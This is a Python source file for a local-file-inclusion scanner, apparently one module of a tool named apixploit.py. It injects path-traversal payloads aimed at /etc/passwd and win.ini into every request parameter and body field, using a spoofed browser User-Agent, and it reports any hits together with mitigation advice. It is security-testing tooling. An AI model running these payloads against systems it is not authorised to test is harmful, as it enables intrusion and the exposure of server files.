import requests
import json
import logging

logger = logging.getLogger(__name__)

class LFIScanner:
    def __init__(self, base_url, path, method, get_params, post_body):
        # Base URL dari apixploit.py, path hanya bagian relatif
        self.base_url = base_url.rstrip('/')  # Hapus trailing slash dari base_url
        # Pastikan path tidak mengandung base_url lagi
        if path.startswith('http://') or path.startswith('https://'):
            self.url = path  # Jika path sudah absolut, gunakan langsung
        else:
            self.url = f"{self.base_url}{path}"  # Gabungkan base_url dengan path relatif
        self.method = method.upper()
        self.get_params = get_params if isinstance(get_params, dict) else {}
        self.post_body = post_body if isinstance(post_body, dict) else {}
        self.payloads = [
            "/etc/passwd",
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "file:///etc/passwd",
            "../windows/win.ini",
            "../../windows/win.ini"
        ]
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            "Accept": "*/*",
            "Origin": self.base_url,
            "Referer": f"{self.base_url}/api/ui/",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }

    def scan(self):
        results = []
        logger.info(f"Scanning {self.method} {self.url} for LFI")

        # Test POST body
        if self.method == "POST" and self.post_body:
            if not isinstance(self.post_body, dict):
                logger.warning(f"Expected dict for post_body, got {type(self.post_body)}: {self.post_body}")
            else:
                for key in self.post_body.keys():
                    for payload in self.payloads:
                        test_body = self.post_body.copy()
                        test_body[key] = payload
                        try:
                            response = requests.post(
                                self.url,
                                json=test_body,
                                params=self.get_params,
                                headers=self.headers,
                                timeout=5
                            )
                            logger.info(f"POST {self.url} with {key}={payload} returned status: {response.status_code}, content: {response.text[:200]}")
                            
                            # Coba parse JSON dan ambil "msg"
                            try:
                                response_json = response.json()
                                response_content = response_json.get("msg", "")
                            except (json.JSONDecodeError, ValueError):
                                response_content = response.text
                            
                            # Deteksi LFI
                            response_lower = response_content.lower()
                            if any(sign in response_lower for sign in ["root:", "nobody:", "daemon:", "bin:", "passwd"]):
                                logger.info(f"LFI detected on {self.method} {self.url} with payload: {payload} in body {key}")
                                results.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'High',
                                    'description': f"The endpoint {self.url} allows Local File Inclusion, exposing sensitive system files like /etc/passwd.",
                                    'reproduce': f"Send POST request to {self.url} with JSON body: {{'{key}': '{payload}'}}",
                                    'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'
                                })
                            elif response.status_code == 200 and len(response_content) > 100:
                                logger.info(f"Potential LFI on {self.method} {self.url} with payload: {payload}, check response: {response_content[:200]}")
                        except Exception as e:
                            logger.error(f"Error scanning {self.url} with payload {payload} in POST body: {str(e)}")

        # Test GET parameters
        if self.get_params:
            if not isinstance(self.get_params, dict):
                logger.warning(f"Expected dict for get_params, got {type(self.get_params)}: {self.get_params}")
            else:
                for param in self.get_params.keys():
                    for payload in self.payloads:
                        test_params = self.get_params.copy()
                        test_params[param] = payload
                        try:
                            response = requests.request(
                                self.method,
                                self.url,
                                params=test_params,
                                json=self.post_body if self.method == "POST" and self.post_body else None,
                                headers=self.headers,
                                timeout=5
                            )
                            logger.info(f"{self.method} {self.url} with {param}={payload} returned status: {response.status_code}, content: {response.text[:200]}")
                            
                            # Coba parse JSON dan ambil "msg"
                            try:
                                response_json = response.json()
                                response_content = response_json.get("msg", "")
                            except (json.JSONDecodeError, ValueError):
                                response_content = response.text
                            
                            response_lower = response_content.lower()
                            if any(sign in response_lower for sign in ["root:", "nobody:", "daemon:", "bin:", "passwd"]):
                                logger.info(f"LFI detected on {self.method} {self.url} with payload: {payload} in param {param}")
                                results.append({
                                    'type': 'Local File Inclusion (LFI)',
                                    'severity': 'High',
                                    'description': f"The endpoint {self.url} allows Local File Inclusion, exposing sensitive system files like /etc/passwd.",
                                    'reproduce': f"Send {self.method} request to {self.url} with {param}={payload}",
                                    'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'
                                })
                            elif response.status_code == 200 and len(response_content) > 100:
                                logger.info(f"Potential LFI on {self.method} {self.url} with payload: {payload}, check response: {response_content[:200]}")
                        except Exception as e:
                            logger.error(f"Error scanning {self.url} with payload {payload} in GET params: {str(e)}")

        return results